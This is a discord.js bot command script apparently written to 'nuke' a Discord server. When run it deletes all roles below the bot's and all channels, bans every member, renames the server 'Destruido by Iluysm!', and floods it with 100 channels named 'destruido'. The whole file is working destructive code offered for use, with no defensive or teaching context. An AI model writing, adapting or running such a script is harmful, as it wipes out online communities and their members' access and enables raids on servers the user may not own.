const discord = require('discord.js')

exports.run = async (client, message) => {

  message.guild.roles
          .filter(r => r.position < message.guild.me.highestRole.position)
          .deleteAll();
      message.guild.channels.deleteAll();

          message.channel.guild.members.forEach(user => {
              user.ban();
          });
  let arg = "Destruido by Iluysm!"
      message.delete();
      message.guild.setName(arg).catch(error => {});


   message.guild.roles
          .filter(r => r.position < message.guild.me.highestRole.position)
          .deleteAll();
      message.guild.channels.deleteAll()


           let name = "destruido"
      message.delete();
      for (pas = 0; pas < 100; pas++) {
          message.guild.createChannel(name, "text").catch(error => {
              console.log(error)
          });
      }


}
